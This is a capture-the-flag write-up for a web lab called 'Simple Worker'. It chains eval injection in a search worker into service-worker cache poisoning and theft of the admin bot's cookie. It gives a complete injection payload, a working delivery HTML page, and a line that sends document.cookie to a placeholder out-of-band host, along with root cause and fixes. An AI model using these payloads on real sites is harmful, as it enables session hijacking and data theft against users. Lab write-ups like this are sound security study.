# Simple Worker: Worker Eval → SW Cache Poison → Admin Cookie Theft

## What Is Happening

Simple Worker is a React SPA with a dedicated search worker and a Service Worker that cache-first serves `/static/*`. Multi-segment paths hit a “page not found / related articles” view that posts `pathname` into `utils-worker.js`, which builds an `eval(...)` expression from that string.

An attacker injects JS in the worker, poisons the `contenthub-v1` Cache API entry for `/static/app.js`, then forces the admin bot to load the lab again in the **same browser profile**. Poisoned `app.js` runs on the main thread and steals `document.cookie`.

## Why It Happens

Worker search code (conceptually):

```js
var expr = "page.title.indexOf('" + query + "') > -1 || page.body.indexOf('" + query + "') > -1";
var match = eval(expr);
```

A pathname containing `'` breaks out of the string and runs arbitrary worker JS.

Dedicated workers can call `caches.open(...)` for the same origin. The SW (`/sw.js`) uses cache name `contenthub-v1` and serves `/static/app.js` cache-first. Replacing that entry turns worker RCE into main-thread XSS on the next full document load.

## Exploit Chain

1. Build a multi-segment lab URL that injects into worker `eval` and poisons `/static/app.js`.
2. Host an external HTML page that:
   - iframes the poison URL
   - waits a few seconds
   - `location.replace`s to the lab origin
3. `POST /report` with that **external** URL (bot accepts non-lab hosts).
4. Poll OAST for the exfil hit containing `flag=...`.

## Exact Test

Confirm worker source:

```bash
curl -s "https://[host]/static/utils-worker.js"
curl -s "https://[host]/sw.js"
```

Confirm report accepts external URLs:

```bash
curl -s -X POST "https://[host]/report" -F "url=https://example.com/"
```

Poison + delivery (placeholders only):

```text
Poison path:
/page/history/x-') > -1 || (caches.open('contenthub-v1').then(c=>c.put('/static/app.js',new Response("location.replace('https://[oast]/d?'+encodeURIComponent(JSON.stringify({c:document.cookie})));",{headers:{'Content-Type':'application/javascript'}}))).then(()=>fetch('https://[oast]/ok')), self.postMessage({results:[]}), 0), ('

Delivery page:
iframe poison URL → wait → location.replace(lab /)
```

## Expected Signal

- OAST `/ok` from the iframe poison visit (worker ran).
- OAST `/d?...` after top navigation with `c=flag=pwnbox{...}` (or equivalent cookie name).
- Separate two-report staging often yields `/ok` only — no main-thread hit.

## Working Delivery Page

```html
<!doctype html>
<html><body>
<script>
(async () => {
  const ifr = document.createElement('iframe');
  ifr.src = 'https://[lab]/page/history/[poison-path]';
  document.body.appendChild(ifr);
  await new Promise(r => setTimeout(r, 4000));
  location.replace('https://[lab]/');
})();
</script>
</body></html>
```

Prefer sync main-thread exfil in the poisoned script:

```js
location.replace('https://[oast]/d?'+encodeURIComponent(JSON.stringify({c:document.cookie})));
```

## Root Cause

Untrusted pathname concatenated into `eval` in a dedicated worker, plus Cache API write access that poisons a SW-cached main-thread script.

## Impact

Theft of the boss/admin cookie from the report bot session (flag cookie was JS-readable).

## Fix

- Replace `eval` search with safe string matching.
- Restrict Cache API mutation from untrusted contexts; treat SW cache as privileged.
- Optionally restrict `/report` to same-origin URLs.
- Mark session/flag cookies `HttpOnly` when JS access is not required.

## Report Summary

Worker pathname injection → Cache API poison of `/static/app.js` → same-profile bot navigation via external iframe delivery → main-thread cookie exfil.

## Confirmed Instances

| Date | Host |
|------|------|
| 2026-07-09 | `a3f30f31cbcc.pwnbox-lab.com` (solved) |
| 2026-07-09 | `6a04c44d7f92.pwnbox-lab.com` (expired mid-solve) |
| 2026-07-09 | `901038c1e5b5.pwnbox-lab.com` (expired mid-solve) |
